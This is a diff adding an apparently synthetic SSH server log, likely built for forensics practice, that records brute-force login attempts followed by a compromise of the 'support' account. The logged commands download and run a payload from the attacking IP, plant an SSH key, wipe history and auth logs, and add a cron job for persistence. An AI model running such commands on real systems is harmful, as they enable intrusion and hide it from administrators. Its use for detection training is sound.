@@ -1,0 +1,54 @@
+[2025-05-15 02:18:11] Server listening on 10.0.5.20 port 22.
+[2025-05-15 02:18:11] Server listening on :: port 22.
+[2025-05-15 04:50:12] Connection from 194.87.112.101 port 44321 on 10.0.5.20 port 22 rdomain ""
+[2025-05-15 04:50:13] Invalid user 'test' from 194.87.112.101 port 44321
+[2025-05-15 04:50:14] Failed password for invalid user test from 194.87.112.101 port 44321 ssh2
+[2025-05-15 04:50:15] Invalid user 'guest' from 194.87.112.101 port 44321
+[2025-05-15 04:50:16] Failed password for invalid user guest from 194.87.112.101 port 44321 ssh2
+[2025-05-15 04:50:17] Connection closed by invalid user guest 194.87.112.101 port 44321 [preauth]
+
+[2025-05-15 05:02:17] Connection from 185.243.112.44 port 45512 on 10.0.5.20 port 22 rdomain ""
+[2025-05-15 05:02:18] Invalid user 'root' from 185.243.112.44 port 45512
+[2025-05-15 05:02:19] Failed password for invalid user root from 185.243.112.44 port 45512 ssh2
+[2025-05-15 05:02:21] Invalid user 'admin' from 185.243.112.44 port 45512
+[2025-05-15 05:02:22] Failed password for invalid user admin from 185.243.112.44 port 45512 ssh2
+[2025-05-15 05:02:24] Invalid user 'ubuntu' from 185.243.112.44 port 45512
+[2025-05-15 05:02:25] Failed password for invalid user ubuntu from 185.243.112.44 port 45512 ssh2
+[2025-05-15 05:02:27] Connection closed by invalid user admin 185.243.112.44 port 45512 [preauth]
+
+[2025-05-15 05:15:01] Connection from 185.243.112.44 port 49876 on 10.0.5.20 port 22 rdomain ""
+[2025-05-15 05:15:02] Failed publickey for invalid user deploy from 185.243.112.44 port 49876 ssh2: RSA SHA256:V7gVd3kLv5sNqWtRf6yH9jU8iK0oLp1M
+[2025-05-15 05:15:04] Failed password for invalid user deploy from 185.243.112.44 port 49876 ssh2
+[2025-05-15 05:15:06] Accepted password for support from 185.243.112.44 port 49876 ssh2
+[2025-05-15 05:15:06] Starting session: shell on pts/0 for support from 185.243.112.44 port 49876 id 1001
+[2025-05-15 05:15:09] Received command: sudo -l
+[2025-05-15 05:15:12] Received command: wget http://185.243.112.44/malware.sh -O /tmp/.systemd
+[2025-05-15 05:15:14] Received command: chmod +x /tmp/.systemd
+[2025-05-15 05:15:16] Received command: /tmp/.systemd --install
+[2025-05-15 05:15:19] Received command: echo ''ssh-rsa AAAAC3NzaC1lZDI1NTE5AAAAIDZ3X9q3X5f8y5gZ3X9q3X5f8y5gZ3X9q3X5f8y5gZ3X user@attack'' >> ~/.ssh/authorized_keys
+[2025-05-15 05:15:22] Received command: history -c
+[2025-05-15 05:15:24] Received command: rm -f /var/log/auth.log*
+[2025-05-15 05:15:26] Received command: exit
+[2025-05-15 05:15:26] Disconnected from user support 185.243.112.44 port 49876
+
+[2025-05-15 06:45:33] Connection from 92.134.56.10 port 53522 on 10.0.5.20 port 22 rdomain ""
+[2025-05-15 06:45:34] Invalid user 'monitor' from 92.134.56.10 port 53522
+[2025-05-15 06:45:35] Failed password for invalid user monitor from 92.134.56.10 port 53522 ssh2
+[2025-05-15 06:45:36] Invalid user 'postgres' from 92.134.56.10 port 53522
+[2025-05-15 06:45:37] Failed password for invalid user postgres from 92.134.56.10 port 53522 ssh2
+[2025-05-15 06:45:38] Connection closed by 92.134.56.10 port 53522 [preauth]
+
+[2025-05-15 08:30:01] Connection from 192.168.1.15 port 55124 on 10.0.5.20 port 22 rdomain ""
+[2025-05-15 08:30:02] Accepted publickey for jdoe from 192.168.1.15 port 55124 ssh2: RSA SHA256:l5kP9sQ2v8YtRf6yH9jU8iK0oLp1MZwXcVbN3mJi4o
+[2025-05-15 08:30:02] Starting session: shell on pts/1 for jdoe from 192.168.1.15 port 55124 id 1002
+[2025-05-15 08:32:15] Received command: git pull origin production
+[2025-05-15 08:33:01] Received command: exit
+[2025-05-15 08:33:01] Disconnected from user jdoe 192.168.1.15 port 55124
+
+[2025-05-15 12:45:11] Connection from 185.243.112.44 port 60123 on 10.0.5.20 port 22 rdomain ""
+[2025-05-15 12:45:12] Accepted publickey for support from 185.243.112.44 port 60123 ssh2: RSA SHA256:V7gVd3kLv5sNqWt f6yH9jU8iK0oLp1M
+[2025-05-15 12:45:12] Starting session: shell on pts/2 for support from 185.243.112.44 port 60123 id 1005
+[2025-05-15 12:45:15] Received command: crontab -l
+[2025-05-15 12:45:18] Received command: echo "* * * * * /tmp/.systemd" | crontab -
+[2025-05-15 12:45:21] Received command: exit
+[2025-05-15 12:45:21] Disconnected from user support 185.243.112.44 port 60123
